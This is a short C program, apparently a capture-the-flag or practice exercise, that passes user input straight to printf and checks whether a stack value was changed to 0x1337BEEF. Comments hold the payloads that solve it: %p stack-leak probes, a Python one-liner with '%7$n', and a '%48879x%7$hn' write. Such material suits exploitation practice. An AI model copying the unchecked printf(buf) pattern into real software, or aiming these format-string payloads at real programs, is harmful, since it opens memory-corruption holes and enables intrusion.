#include <stdio.h>

int main()
{
  long int v4[2];
  char buf[48];

  v4[0] = 0x1337BABE;
  v4[1] = (long int)v4;

  read(0, buf, 48);

  printf("\n[!] Checking.. ");
  printf(buf);
  if (v4[0] == 0x1337BEEF)
    printf("EBAA\n");

}

// AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

// \x07\x00\x00\x00\x00\x00\x00\x00
/*
python2.7 -c 'print "\x10\x60\x40\x00" + "%7$n"'

AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

AAAAA%7$n

%48879x%7$hn + \xef\xbe\x37\x13\x00\x00\x00\x00

*/


// %5x%7$hn + \x05\x00\x00\x00\x00\x00\x00\x00